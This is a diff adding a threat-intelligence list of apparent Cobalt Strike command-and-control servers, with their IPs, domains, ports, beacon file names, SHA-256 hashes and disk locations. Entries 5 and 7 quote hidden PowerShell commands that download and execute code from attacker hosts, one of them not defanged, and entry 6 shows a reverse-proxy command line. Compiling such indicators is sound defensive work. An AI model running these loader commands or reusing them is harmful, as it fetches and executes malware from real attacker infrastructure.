@@ -1,0 +1,72 @@
+1) 111.90.143.233 (Cobalt Strike C2)
+---
+ports:443
+beacons: 
+	- beacon.dll		| be0eae80515553de45108c8d3c6d54dda7597536968031dc40c732c0961ec6fa
+	- csrss.dll			| 4b89d259196985a0c49253c58fee8182a1ae5482af84ba2ed39cc98d798f60de
+	- Location on disc: C:\Users\<user>\AppData\Local\Temp
+
+
+2) johnjeffriesphotography.com | 172.67.203.108,104.21.37.30 (Cobalt Strike C2)
+-----
+ports:443
+beacons: 
+	- friend.dat | 114bcc91d144bf62815ea51a8536049346e9d075937820e29f25605b0088d833
+	- Location on disc: %USERPROFILE%
+
+
+3) 101.99.95.105 (Cobalt Strike C2)
+---
+ports:443
+beacons: 
+	- smss.dll		| cb458362e56ace4b3f2859a2e340fa5afefcff4e46acff0ba5968a1d4c9e439e
+	- Registry.dll	| cf7e9ef49ff3572505c46646c37a24d32caee5a1d5a01e7c75b9943f613977b4
+	- Location on disc: C:\Users\<user>\AppData\Local\Temp
+
+
+4) vosuxizen.com	| (Cobalt Strike C2)
+---
+ports:
+	- 443: Cobalt Strike C2
+beacons:
+	- xc.dll	| 35bcc6e1410f3b7ef95301d996f5713e6811fc09b98edeb51d0222cbe099ce14
+	- Location on disc: C:\Users\<user>\AppData\Local\Temp
+
+5) ineoserver.com | 154.7.253.15 (Cobalt Strike C2: PowerShell Loader)
+---
+ports:4443
+PowerShell Loader:
+	- powershell.exe  -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxps://ineoserver[.]com:4443/coin'))"
+
+
+6) 46.174.236.175 | (Reverse proxy)
+---
+ports:443
+tool:
+	- <redacted>.exe	| 02ca12721482c81fcbac0ba493fc62ceed32b38420a4ef8e168f0537c9da4e2b
+	- Location on disc: C:\Windows\Tasks
+	- Command Line Execution: <redacted>.exe R:22560:fox 0.0.0.0:80:127.0.0.1:18080
+
+
+7) 194.104.136.70 (C2 Downloading C2 DLL beacon)
+---
+ports:443
+PowerShell Loader:
+	- powershell  IEX(New-Object Net.WebClient).downloadString('http://194.104.136.70/dsaoxksaonjxhbusahbubuhsabuxsbua')
+
+
+
+8) 111.90.146.218
+-----
+ports:
+	- 80: Hosting 2nd stage payloads
+	- 8443,443: Cobalt Strike C2
+beacons: 
+	- lsass.exe		| 6b62627e4661becc11a7df7adc6300c91ba639f39adfdf80fae458326187a648
+	- lsass.dll		| 34f64043b5469aa05c9f2ca03127e15c247249eabb6f743bc4ec9c90e137c031
+	- Location on disc: C:\Users\<user>\AppData\Local\Temp
+
+
+9) 	104.36.231.98 (Hosting 2nd stage payloads)
+ports:
+	- 80: Hosting 2nd stage payloads
